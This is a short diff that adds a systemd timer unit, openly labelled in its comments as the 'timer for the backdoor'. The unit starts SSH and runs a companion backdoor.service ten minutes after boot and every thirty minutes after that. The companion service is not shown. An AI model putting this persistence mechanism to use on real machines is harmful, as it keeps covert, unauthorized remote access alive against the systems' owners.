@@ -1,0 +1,14 @@
+# this file is run only once, check backdoor.service for file run each time the timer "rings"
+[Unit]
+Description=timer for the backdoor
+
+# start sshd.service so i dont have to wait 5 mins after boot to ssh into the machine if i want to
+Wants=ssh.service
+
+# will start 10 min (to allow for network connection) after systemd boot up, and repeat every 30min after it is started
+[Timer]
+OnStartupSec=10m
+OnUnitActiveSec=30m
+
+[Install]
+WantedBy=timers.target
